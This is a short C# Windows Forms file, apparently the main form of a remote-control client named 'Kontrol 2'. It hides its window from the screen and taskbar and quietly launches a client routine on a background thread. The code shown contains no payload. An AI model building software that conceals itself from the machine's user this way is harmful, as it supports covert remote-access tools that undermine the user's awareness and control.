using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Kontrol_2_Client
{
	public partial class MainForm : Form
	{
		public MainForm()
		{
			this.Visible = false;
			this.WindowState = FormWindowState.Minimized;
			this.ShowInTaskbar = false;
			InitializeComponent();
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			new Thread(() =>
			{
				Client.Execute();
			}).Start();
		}
	}
}
